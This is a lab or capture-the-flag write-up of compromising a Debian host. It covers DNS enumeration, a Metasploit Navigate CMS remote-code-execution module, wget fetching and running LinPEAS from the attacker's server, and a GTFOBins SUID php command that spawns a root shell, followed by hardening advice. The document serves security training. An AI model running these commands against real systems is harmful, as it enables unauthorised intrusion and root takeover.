# DNS Enumeration, Navigate CMS RCE & SUID Privilege Escalation (Linux)

## Overview

This project demonstrates the compromise of a Linux web server through **DNS enumeration, CMS vulnerability exploitation, and privilege escalation via SUID misconfiguration**.

The engagement began with network reconnaissance that revealed a **DNS service and a default nginx web server**. Further investigation uncovered a hidden domain that hosted a vulnerable **Navigate CMS instance**. A publicly available exploit was used to achieve **remote code execution**, providing an initial shell on the system. Privilege escalation was then achieved by abusing a **misconfigured SUID binary** identified during enumeration.

This exercise demonstrates an end-to-end attack chain including:

- Network reconnaissance
- DNS enumeration
- Web application discovery
- Exploitation of a CMS vulnerability
- Shell stabilization
- Linux privilege escalation

---

# Objectives

This project demonstrates the ability to:

- Perform **network reconnaissance with Nmap**
- Identify and enumerate **DNS services**
- Conduct **directory brute-forcing**
- Discover hidden **virtual hosts**
- Exploit **Navigate CMS Remote Code Execution**
- Establish and stabilize a **remote shell**
- Perform **Linux privilege escalation using SUID binaries**
- Achieve **root-level access**

---

# Environment / Lab Setup

| Component | Details |
|----------|--------|
| Attacker Machine | Kali Linux |
| Target Machine | Debian Linux |
| Target IP Address | `192.168.88.137` |
| Web Server | Nginx 1.14.2 |
| DNS Service | ISC BIND 9.11 |
| CMS | Navigate CMS |
| Enumeration Tool | LinPEAS |

---

# Methodology

# 1. Network Reconnaissance

The engagement began with a full TCP scan using **Nmap**.

### Command Used

```bash
nmap -T4 -p- -A 192.168.88.137
```

### Key Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian
53/tcp open  domain  ISC BIND 9.11.5
80/tcp open  http    nginx 1.14.2
```

### Observations

- SSH service available on **port 22**
- DNS server running **BIND on port 53**
- Web server running **nginx on port 80**

<img width="1041" height="547" alt="image" src="https://github.com/user-attachments/assets/aee3fcbf-5f12-4c18-9286-ff117146377e" />

---

# 2. Web Server Enumeration

Navigating to the web server returned the **default nginx landing page**:

```
Welcome to nginx!
```

<img width="1043" height="217" alt="image" src="https://github.com/user-attachments/assets/a911b66d-e875-4443-8f4d-208d3f457487" />

Viewing the page source revealed a potential clue:

```
webmaster: alek@blackpearl.tcm
```

This suggested the existence of a domain called **blackpearl.tcm**.

<img width="929" height="738" alt="image" src="https://github.com/user-attachments/assets/6fc05ca1-53ec-494d-a67d-372272be5432" />

---

# 3. Directory Enumeration

Directory brute-forcing was performed using **FFUF**.

### Command Used

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.88.137/FUZZ
```

A directory named **/secret** was discovered.

<img width="1039" height="44" alt="image" src="https://github.com/user-attachments/assets/2b483a7b-4d82-405c-9f24-ad5cd9900d45" />

Accessing this path downloaded a file containing the following message:

```
OMG you got r00t !

Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek
```

<img width="1037" height="175" alt="image" src="https://github.com/user-attachments/assets/6d61645f-6cb7-480b-9978-82c9c474fada" />

This indicated that the attack path likely involved another service.

---

# 4. DNS Enumeration

Since **port 53** was open, further DNS reconnaissance was performed using **dnsrecon**.

### Command Used

```bash
dnsrecon -r 127.0.0.0/24 -n 192.168.88.137 -d blah
```

### Result

The scan revealed a DNS pointer record for:

```
blackpearl.tcm
```

This domain pointed to the target host.

<img width="725" height="125" alt="image" src="https://github.com/user-attachments/assets/09914be4-6962-4faf-8c13-a27fd374f9a5" />

---

# 5. Updating Local DNS Resolution

The discovered domain was added to the attacker machine's `/etc/hosts` file.

```
192.168.88.137 blackpearl.tcm
```

After updating the hosts file, navigating to the domain displayed a **PHP web application**.

```
http://blackpearl.tcm
```

<img width="1043" height="454" alt="image" src="https://github.com/user-attachments/assets/7debfce1-e8e6-4cfb-ae5b-f3784201b6c2" />

---

# 6. Directory Enumeration on Virtual Host

Directory enumeration was repeated against the newly discovered domain.

### Command Used

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
```

A new directory was discovered:

```
/navigate
```

Navigating to:

```
http://blackpearl.tcm/navigate
```

revealed a **Navigate CMS login page**.

<img width="1039" height="445" alt="image" src="https://github.com/user-attachments/assets/afdc6a67-6b2f-4844-beda-22d879d6e24c" />

---

# 7. Exploiting Navigate CMS

Research identified a known **unauthenticated remote code execution vulnerability** affecting Navigate CMS.

### Exploit References

```
https://www.exploit-db.com/exploits/45561
https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
```

The exploit is available in the **Metasploit Framework**.

---

# 8. Running the Metasploit Exploit

Metasploit was used to exploit the vulnerability.

### Commands Used

```bash
msfconsole
```

```bash
use exploit/multi/http/navigate_cms_rce
set RHOSTS 192.168.88.137
set VHOST blackpearl.tcm
run
```

<img width="1027" height="702" alt="image" src="https://github.com/user-attachments/assets/e469ecc3-97ec-41aa-a4e5-0d9975a5ada2" />

The exploit successfully returned a shell on the target system.

<img width="1043" height="346" alt="image" src="https://github.com/user-attachments/assets/99155aa2-bce4-41ab-92c2-e44addb5a1e3" />

---

# 9. Shell Stabilization

The initial shell was limited, so a proper TTY shell was spawned.

Python was already installed on the system.

<img width="208" height="48" alt="image" src="https://github.com/user-attachments/assets/edb51dab-6809-4dd0-b76d-6b52caeefd67" />

### Command Used

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a fully interactive shell.

<img width="615" height="126" alt="image" src="https://github.com/user-attachments/assets/ca754712-aa40-4e13-8130-ca3e2f873dac" />

---

# 10. Privilege Escalation Enumeration

To identify privilege escalation opportunities, **LinPEAS** was used.

### Hosting LinPEAS

On the attacker machine:

```bash
python3 -m http.server 80
```

<img width="693" height="281" alt="image" src="https://github.com/user-attachments/assets/ae56ec8f-d9b8-4645-b0f3-a211c4b4e20e" />

---

### Download LinPEAS on Target

```bash
wget http://192.168.88.128/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

# 11. Identifying SUID Misconfiguration

LinPEAS revealed several binaries with the **SUID bit set**.

<img width="1032" height="503" alt="image" src="https://github.com/user-attachments/assets/21a71926-6f8a-44f5-8ad7-df024d2881ef" />

One notable binary:

```
/usr/bin/php7.3
```

SUID binaries execute with the **privileges of the file owner**, which in this case was **root**.

---

# 12. Privilege Escalation via SUID PHP

Consulting **GTFOBins** revealed a privilege escalation technique using SUID PHP.

Reference:

```
https://gtfobins.github.io/gtfobins/php/#suid
```

### Exploit Command

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

---

# 13. Root Access

Executing the command spawned a shell with **root privileges**.

```
uid=0(root) gid=0(root)
```

<img width="927" height="117" alt="image" src="https://github.com/user-attachments/assets/d8c772d6-6d45-4802-b2ad-6f01d556721c" />

This confirmed **full system compromise**.

---

# Tools Used

| Tool | Purpose |
|-----|------|
| Nmap | Network scanning and service enumeration |
| FFUF | Web directory brute forcing |
| dnsrecon | DNS enumeration |
| Metasploit | Exploiting Navigate CMS vulnerability |
| Netcat / Meterpreter | Remote shell interaction |
| Python | TTY shell spawning |
| LinPEAS | Linux privilege escalation enumeration |
| GTFOBins | Privilege escalation reference |

---

# Key Findings

| Vulnerability | Description | Severity |
|---------------|------------|----------|
| DNS Information Disclosure | Hidden domain revealed through DNS enumeration | Medium |
| Navigate CMS RCE | Allows unauthenticated remote code execution | Critical |
| SUID Misconfiguration | PHP binary executable as root | Critical |
| Weak System Hardening | Privilege escalation paths not restricted | High |

---

# Attack Chain Summary

| Stage | Action |
|------|------|
| 1 | Performed Nmap scan |
| 2 | Identified nginx web server and DNS service |
| 3 | Extracted domain clue from web page source |
| 4 | Enumerated DNS records with dnsrecon |
| 5 | Added `blackpearl.tcm` to local hosts file |
| 6 | Performed directory enumeration |
| 7 | Discovered Navigate CMS |
| 8 | Exploited Navigate CMS RCE with Metasploit |
| 9 | Gained initial shell |
| 10 | Stabilized shell with Python TTY |
| 11 | Ran LinPEAS for privilege escalation enumeration |
| 12 | Identified SUID PHP binary |
| 13 | Executed GTFOBins SUID exploit |
| 14 | Obtained root access |

---

# Mitigation / Recommendations

## Harden DNS Services

Restrict DNS enumeration and zone transfers to trusted hosts only.

---

## Remove Development Artifacts

Clues such as domain names or emails should not be exposed in public web pages.

---

## Patch Vulnerable CMS Software

Navigate CMS should be updated or replaced with a supported version that fixes known vulnerabilities.

---

## Restrict SUID Permissions

Only essential binaries should have the **SUID bit set**, and permissions should be regularly audited.

---

## Implement Web Application Security Controls

Deploy:

- Web Application Firewalls (WAF)
- Input validation
- Access controls for CMS administration interfaces

---

## Conduct Regular Security Audits

Routine vulnerability scans and penetration tests can identify issues such as exposed DNS records and privilege escalation vectors.

---

# Skills Demonstrated

This project demonstrates the following offensive security skills:

- Network reconnaissance
- DNS enumeration and analysis
- Web directory brute forcing
- Virtual host discovery
- Web application vulnerability exploitation
- Reverse shell management
- Shell stabilization techniques
- Linux privilege escalation via SUID binaries

---

# Key Takeaways

This project demonstrates a complete **Linux system compromise** beginning with DNS enumeration and ending with **root-level access**.

The attack highlights how seemingly minor information leaks—such as exposed domain names—can lead to deeper exploitation opportunities.

By chaining together **service enumeration, CMS exploitation, and privilege escalation**, the engagement demonstrates real-world offensive security techniques relevant to **penetration testing and red team operations**.
